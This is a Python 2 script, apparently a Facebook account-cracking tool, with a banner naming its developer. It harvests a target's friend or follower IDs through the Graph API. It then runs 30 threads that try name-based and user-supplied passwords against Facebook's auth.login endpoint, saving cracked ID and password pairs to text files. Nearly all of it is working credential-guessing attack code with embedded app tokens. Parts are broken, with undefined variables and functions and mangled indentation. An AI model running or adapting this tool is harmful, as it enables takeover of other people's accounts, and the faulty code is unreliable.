#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written (SUFYAN AHMAD SHABQADRY)
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

agents = [
  "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3"
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = """
\033[1;91m     $$$$$$\    $$$$$$\    $$$$$$\  
\033[1;92m    $$  __$$\  $$  __$$\  $$  __$$\ 
\033[1;93m    $$ /  \__| $$ /  $$ | $$ /  \__|
\033[1;94m    \$$$$$$\   $$$$$$$$ | \$$$$$$\  
\033[1;95m     \____$$\  $$  __$$ |  \____$$\ 
\033[1;96m    $$\   $$ | $$ |  $$ | $$\   $$ |
\033[1;97m    \$$$$$$  | $$ |  $$ | \$$$$$$  |
\033[1;98m     \______/  \__|  \__|  \______/ 
\033[1;93m----------------------------------------------------
     Commond Owner Is Mr-SuFyaN Love Of AhMad
\033[1;93m-----------------------------------------------------
                                                                                                  \033[1;93m-----------------------------------------------------
 \033[1;93m(*)\033[1;92m Developer: (SuFyaN AhMad ShabQadry)
 \033[1;93m(*)\033[1;92m WhatsApp :   03489458276
 \033[1;93m(*)\033[1;92m Facebook : https://www.facebook.com/Sufyan.shabqadry
\033[1;93m-----------------------------------------------------
"""
def tool():
	os.system("clear")
	print("")
	print(logo)
	time.sleep(1)
	print("First Put Tool Username...").center(50)
	print("")
	time.sleep(1)
	username = raw_input("[!] Tool Username : ")
	if username =="(sufyan)":
		print("")
		time.sleep(1)
		print("\033[1;92mTool Username is correct").center(50)
		print("")
		time.sleep(1)
		step_main()
	else:
		print("")
		time.sleep(1)
		print("\033[1;91mTool Username Is Invalid :) ").center(50)
		print("")
		time.sleep(1)
		tool()
def step_main():
	os.system("clear")
	print(logo)
	print("")
	time.sleep(1)
	print("First Put Tool Password...").center(50)
	print("")
	time.sleep(1)
	username = raw_input("[!] Tool Password : ")
	if username =="(SAS)":
		print("")
		time.sleep(1)
		print("\033[1;92mTool Password is correct").center(50)
		print("")
		time.sleep(1)
		main()
	else:
		print("")
		time.sleep(1)
		print("\033[1;91mTool Password Is Invalid :) ").center(50)
		print("")
		time.sleep(1)
		step_main()
		
def main():
	os.system("clear")
	print(logo)
	print("")
	print("\x1b[1;93m\t(Choose Method)")
	print("")
	print("\x1b[1;93m[1]\x1b[1;92m B-API Method \x1b[1;93m[Best]\n")
	print("\x1b[1;93m[2]\x1b[1;91m Start Cloning❤️\n")
	print("")
	os.system('xdg-open https://www.facebook.com/Sufyan.shabqadry')
	log_sel()
def log_sel():
	select = raw_input("\033[1;92mChoose option: \033[0;93m")
	if select =="1":
		login()
   
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def login():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
		print("")
		print(" \x1b[1;92m  \t(Login menu)")
		print("")
		print(47*"-")
		print("\x1b[1;92m[1]\x1b[1;93m Login with id/Pass\n")
		print("\x1b[1;92m[2]\x1b[1;93m Login with token \x1b[1;92m[BEST]\n")
		print("\x1b[1;92m[3]\x1b[1;93m Back ")
		print(47*"\x1b[1;92m-")
		print("")
		log_select()
def log_select():
	sel = raw_input("\x1b[1;92m Choose option: ")
	if sel =="1":
		log_fb()
	elif sel =="2":
		token()
	elif sel =="3":
		ran()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def log_fb():
	os.system("clear")
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		print(logo)
		print("")
		print("\tFacebook id/pass login")
		print("")
		uid = raw_input(" Uid: ")
		passw = raw_input(" Password: ")
		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
		q = json.loads(data)
		if "access_token" in q:
			sav = open("access_token.txt", "w")
			sav.write(q["access_token"])
			sav.close()
			menu()
		elif "www.facebook.com" in q["error"]:
			print("")
			print("\tAccount has checkpoint")
			print("")
			time.sleep(1)
			login()
		else:
			print("")
			print("\tId/pass my be wrong")
			print("")
			time.sleep(1)
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        
        token = raw_input        ("\x1b[1;93m Paste token :\x1b[1;92m ")
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("")
    print("\x1b[1;92m            WELLCOME : "+name)
    print("")
    print(47*"-")
    print("")
    print("\x1b[1;92m[1]\x1b[1;93m Crack with Name + pass\n")
    print("\x1b[1;92m[2]\x1b[1;93m Crack with Only 7 Password\n")
    print("\x1b[1;92m[3]\x1b[1;93m Back ")
    print(47*"\x1b[1;92m-")
    print("")
    menu_option()
def menu_option():
	select = raw_input("\033[1;92mChoose option: \033[0;93m")
	if select =="1":
		crack()
	elif select =="2":
		choice()
		
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mAUTO PASS CRACK\033[0;97m")
	print("")
	print(47*"\x1b[1;92m-")
	print("\x1b[1;92m[1]\x1b[1;93m Crack Public Id")
	print("\x1b[1;92m[2]\x1b[1;93m Crack Followers Id")
	print("\x1b[1;92m[0]\x1b[1;93m Back")
	print(47*"\x1b[1;92m-")
	print("")
	crack_select()
def crack_select():
	select = raw_input("\033[1;33mChoose option: \033[0;92m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		p1 = raw_input("(*) Name + Pass : ")
		p2 = raw_input("(*) Name + Pass : ")
		p3 = raw_input("(*) Name + Pass : ")
		p4 = raw_input("(*) Name + Pass : ")
		pass5 = raw_input("(*) Password : ")
		pass6 = raw_input("(*) Password : ")
		pass7 = raw_input("(*) Password : ")
		idt = raw_input("\x1b[1;93m Input id:\x1b[1;92m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("  🔥SUFYAN-AHMAD🔥 START CRACKING.....")
			print('')
			print("  Cloning from :\x1b[1;92m "+q["name"])
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		
		p1 = raw_input("(*) Name + Pass : ")
		p2 = raw_input("(*) Name + Pass : ")
		p3 = raw_input("(*) Name + Pass : ")
		p4 = raw_input("(*) Name + Pass : ")
		pass5 = raw_input("(*) Password : ")
		pass6 = raw_input("(*) Password : ")
		pass7 = raw_input("(*) Password : ")
		
		
		
		idt = raw_input("\x1b[1;93m Input id:\x1b[1;92m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("  🔥SUFYAN-AHMAD🔥 START CRACKING.....")
			print('')
			print("  Cloning from:\x1b[1;92m "+q["name"])
		except KeyError:
			print("\tInvalid id link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		crack_select()
	print("\x1b[1;93m  Total IDs :\x1b[1;92m "+str(len(id)))
	print("\x1b[1;93m  The Process has been started ✓")
	print("\x1b[1;93m  Plzz wait to Crack idzz")
	print("\x1b[1;93m  Press ctrl + z to stop")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower()+p1
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass1+ name+"\033[0;97m")
				ok = open("SYED-ZADAok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass1+ name+"\033[0;97m")
					cp = open("SYED-ZADAcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower()+p2
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass2+ name+"\033[0;97m")
						ok = open("SYED-ZADAok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass2+ name+"\033[0;97m")
							cp = open("SYED-ZADAcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+p3
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass3+name+"\033[0;97m")
								ok = open("SYED-ZADAok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass3+ name+"\033[0;97m")
									cp = open("SYED-ZADAcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+p4
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass4+ name+"\033[0;97m")
										ok = open("SYED-ZADAok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass4+ name+"\033[0;97m")
											cp = open("SYED-ZADAcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower()+p5
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass5+ name+"\033[0;97m")
												ok = open("SYED-ZADAok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass5+ name+"\033[0;97m")
													cp = open("SYED-ZADAcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
												  pass6 = name.lower()+p6
													
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass6+ name+"\033[0;97m")
														ok = open("SYED-ZADAok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass6+ name+"\033[0;97m")
															cp = open("SYED-ZADAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower()+p7
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [SUFYAN-OK] "+uid+" | "+pass7+ name+"\033[0;97m")
																ok = open("SYED-ZADAok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [SUFYAN-CP] "+uid+" | "+pass7+ name+"\033[0;97m")
																	cp = open("SYED-ZADAcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	print(47*"\x1b[1;92m-")
	print("   \x1b[1;92mThe process has been completed")
	print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	print(47*"-")
	print("")
	print("")
	raw_input(" \x1b[1;93m Press enter to back ")
	menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mCHOICE PASS CRACK\033[0;97m")
	print("")
	print(47*"\x1b[1;93m-")
	print("\x1b[1;93m[1]\x1b[1;92m Crack Public id")
	print("\x1b[1;93m[2]\x1b[1;92m Crack Followers id")
	print("\x1b[1;93m[0]\x1b[1;93m Back")
	print(47*"-")
	print("")
	choice_select()
def choice_select():
	select = raw_input("\033[1;33mChoose option: \033[0;92m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mONLY PASS PUBLIC CRACKING\033[0;97m")
		print("")
		pass1 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass2 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass3 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass4 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass5 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass6 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass7 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		idt = raw_input("\x1b[1;92m Input id:\x1b[1;93m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print(" Cloning from :\x1b[1;92m "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mONLY PASS FOLLOWERS CRACKING \033[0;97m")
		print (logo)
		try:
			idlist = raw_input("[ok] Enter File Path  : ")
			pass1=raw_input(" Put Password No 1 : ")
			pass2=raw_input(" Put Password No 2 : ")
			pass3=raw_input(" Put Password No 3 : ")
			pass4=raw_input(" Put Password No 4 : ")
			pass5=raw_input(" Put Password No 5 : ")
			pass6=raw_input(" Put Password No 6 : ")
			pass7=raw_input(" Put Password No 7 : ")
			pass8=raw_input(" Put Password No 8 : ")
			pass9=raw_input(" Put Password No 9 : ")
			pass10=raw_input(" Put Password No 10 : ")
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			choice_menu()
	elif bch =="0":
		menu()
	else:
		print ("[!] Fill in correctly")
		choice_action()
	xxx = str(len(id))
	psb ("[ok] Total Friends: "+xxx)
	time.sleep(0.5)
	psb ("[ok] Please wait, process is running ...")
	time.sleep(0.5)
	psb ("[!] To Stop Process Press CTRL Then Press z")
	time.sleep(0.5)
	print (50*"-")
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
		except OSError:
			pass
		try:
			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q1 = json.loads(data1.text)
			if "access_token" in q1:
				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q1["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q2 = json.loads(data2.text)
					if "access_token" in q2:
						print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q2["error_msg"]:
							print "[Checkpoint] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q3 = json.loads(data3.text)
							if "access_token" in q3:
								print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q3["error_msg"]:
									print "[Checkpoint] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q4 = json.loads(data4.text)
									if "access_token" in q4:
										print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q4["error_msg"]:
											print "[Checkpoint] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
										else:
											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q5 = json.loads(data5.text)
											if "access_token" in q5:
												print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q5["error_msg"]:
													print "[Checkpoint] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
												else:
													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q6 = json.loads(data6.text)
													if "access_token" in q6:
														print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q6["error_msg"]:
															print "[Checkpoint] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
														else:
															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q7 = json.loads(data7.text)
															if "access_token" in q7:
																print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q7["error_msg"]:
																	print "[Checkpoint] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
																else:
																	data8 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q8 = json.loads(data8.text)
																	if "access_token" in q8:
																		print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass8
																		oks.append(user+pass8)
																	else:
																		if "www.facebook.com" in q8["error_msg"]:
																			print "[Checkpoint] " + user + " | " + pass8
																			cps = open("checkpoint.txt", "a")
																			cps.close()
																			cpb.append(user+pass8)
																		else:
																			data9 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q9 = json.loads(data9.text)
																			if "access_token" in q9:
																				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass9
																				oks.append(user+pass9)
																			else:
																				if "www.facebook.com" in q9["error_msg"]:
																					print "[Checkpoint] " + user + " | " + pass9
																					cps = open("checkpoint.txt", "a")
																					cps.close()
																					cpb.append(user+pass9)
																				else:
																					data10 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q10 = json.loads(data10.text)
																					if "access_token" in q10:
																						print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass10
																						oks.append(user+pass10)
																					else:
																						if "www.facebook.com" in q10["error_msg"]:
																							print "[Checkpoint] " + user + " | " + pass10
																							cps = open("checkpoint.txt", "a")
																							cps.close()
																							cpb.append(user+pass10)
																							
																							
																				
																				
																				
																			
																			
																		
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	print(47*"\x1b[1;92m-")
	print(" \x1b[1;92m  The process has been completed")
	print(" \x1b[1;92m   Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	print(47*"-")
	print("")
	print("")
	raw_input(" \x1b[1;93m Press enter to back ")
	main()
	
	
if __name__ == '__main__':
	tool()


